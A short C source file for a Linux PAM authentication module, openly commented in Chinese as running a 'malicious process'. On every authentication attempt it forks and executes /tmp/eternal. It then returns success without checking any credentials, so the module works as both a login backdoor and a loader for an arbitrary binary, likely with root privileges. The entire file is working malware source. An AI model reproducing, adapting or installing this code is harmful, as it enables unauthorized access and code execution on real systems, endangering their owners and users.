#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    printf("PAM 模块已激活。\n");
    // 执行恶意进程
    if (fork() == 0) {
        execl("/tmp/eternal", "eternal", NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    }
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
